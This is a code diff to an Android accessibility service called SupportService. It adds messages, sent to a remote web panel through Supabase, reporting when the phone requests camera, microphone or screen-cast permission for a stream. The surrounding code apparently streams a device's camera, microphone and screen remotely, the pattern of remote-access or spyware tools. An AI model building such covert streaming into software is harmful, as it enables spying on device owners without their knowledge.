@@ -54,6 +54,8 @@ public class SupportService extends AccessibilityService implements SupabaseMana
                 if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     Log.w(TAG, "Camera permission missing for stream. Requesting...");
                     requestPermission("camera");
+                    // Kirim log ke web agar user tau HP lagi nanya izin
+                    if (supabaseManager != null) supabaseManager.sendData("logs", "[System] Requesting Camera permission on device...");
                     return;
                 }
             }
@@ -63,6 +65,7 @@ public class SupportService extends AccessibilityService implements SupabaseMana
                 if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     Log.w(TAG, "Mic permission missing for stream. Requesting...");
                     requestPermission("mic");
+                    if (supabaseManager != null) supabaseManager.sendData("logs", "[System] Requesting Microphone permission on device...");
                     return;
                 }
             }
@@ -72,6 +75,7 @@ public class SupportService extends AccessibilityService implements SupabaseMana
                 if (getMirrorIntent() == null) {
                     Log.w(TAG, "Mirroring intent missing. Requesting...");
                     requestPermission("screen");
+                    if (supabaseManager != null) supabaseManager.sendData("logs", "[System] Requesting Screen Cast permission on device...");
                     return;
                 }
             }
